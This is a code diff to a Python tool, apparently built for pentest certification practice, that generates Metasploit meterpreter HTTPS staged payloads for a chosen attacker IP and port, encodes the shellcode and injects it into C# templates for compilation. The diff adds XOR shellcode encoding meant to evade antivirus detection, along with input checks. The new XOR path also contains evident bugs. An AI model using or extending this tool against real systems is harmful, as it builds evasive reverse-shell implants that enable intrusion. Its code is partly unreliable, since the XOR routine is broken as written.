@@ -4,11 +4,16 @@ import argparse
 import os
 import glob
 import random
+import string
+import itertools
+import base64
+import socket
 
 def cheers():
     print()
     print("[+] We're all done here")
     print("[+] Now go and get this certification :)")
+
 
 def exe_will_rain():
     print("[+] Starting to compile CS files..")
@@ -97,7 +102,63 @@ def rot_encoding(content_32, content_64):
         print(str(e))
         quit()
 
+    #print(enc_content_32)
     return enc_content_32, enc_content_64, dec_routine
+
+
+def xor_crypt_string(data: bytes(), key:string):
+    l = len(key)
+    keyAsInt = list(map(ord, key))
+    xored = bytes(bytearray((
+	    (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))
+	)))
+    return xored 
+
+
+def xor_encoding(content_32, content_64):
+    enc_content_32 = ""
+    enc_content_64 = ""
+    try:
+        letters = string.ascii_lowercase
+        key = "".join(random.choice(letters) for i in range(16))
+        print("[+] Encoding shellcode with XOR key: %s"%(key))
+
+        xor_32 = xor_crypt_string(bytes.fromhex(content_32), key)
+        #print("XOR'ed content32: ")
+        #print(enc_content_32)
+
+        xor_64 = xor_crypt_string(bytes.fromhex(content_64), key)
+        #print("XOR'ed content64: ")
+        #print(enc_content_64)
+
+        plain_32 = xor_crypt_string(bytes.fromhex(xor_32), key)
+        print("UNXOR'ed content32: ")
+        print(plain_32)
+
+    except Exception as e:
+        print(str(e))
+        quit()
+    
+
+    try:
+        for i in bytearray.fromhex(xor_32):
+            j = i 
+            enc_content_32 += '0x'
+            enc_content_32 += '%02x,' %j
+
+        enc_content_32 = enc_content_32[:-1]
+        
+        for i in bytearray.fromhex(xor_64):
+            j = i
+            enc_content_64 += '0x'
+            enc_content_64 += '%02x,' %j
+
+        enc_content_64 = enc_content_64[:-1]
+
+    except Exception as e:
+        print(str(e))
+        quit()
+
 
 def msf_gen(l:str, p:int):
     print("[+] Generating x86 and x64 MSF HTTPS staged payloads, for %s:%d"%(l,p))
@@ -125,7 +186,6 @@ def msf_gen(l:str, p:int):
         print(str(e))
         quit()
 
-
     return content_32, content_64
 
 
@@ -142,6 +202,26 @@ def cli_parser():
 
     return args.l, args.p, args.e
 
+def check_ip(l):
+    try:
+        socket.inet_aton(l)
+    except:
+        print("[-] '%s' is not a valid IP address"%(l))
+        quit()
+
+def check_port(p):
+    try:
+        int(p)
+    except Exception as e:
+        print(str(e))
+        quit()
+
+    if 1 <= p <= 65535:
+        pass
+    else:
+        print("[-] '%s' is not a valid port"%(p))
+        quit()
+
 
 if __name__=="__main__":
     #Get IP and port from command line arguments
@@ -149,13 +229,14 @@ if __name__=="__main__":
     p:int
     e:str
     l, p, e = cli_parser()
+    check_port(p)
+    check_ip(l)
 
     #Generating corresponding meterpreter payloads
     content_32:str
     content_64:str
     content_32, content_64 = msf_gen(l, p)
 
-    
     shell_mark:str = "!!!_SHELLCODE_MARK!!!"
     dec_mark:str = "!!!DECODE_ROUTINE!!!"
     dec_routine:str = ""
@@ -166,6 +247,10 @@ if __name__=="__main__":
         #Open all files in "templates" folder, and swap the content with the payloads
         template_filling(shell_mark, dec_mark, dec_routine, content_32, 32)
         template_filling(shell_mark, dec_mark, dec_routine, content_64, 64)
+    elif str(e).upper() == "XOR":
+        # Encoding with XOR
+        content_32, content_64, dec_routine = xor_encoding(content_32, content_64)
+        quit()
     else:
         print("[-] Did you set a supported encoding method?")
         quit()
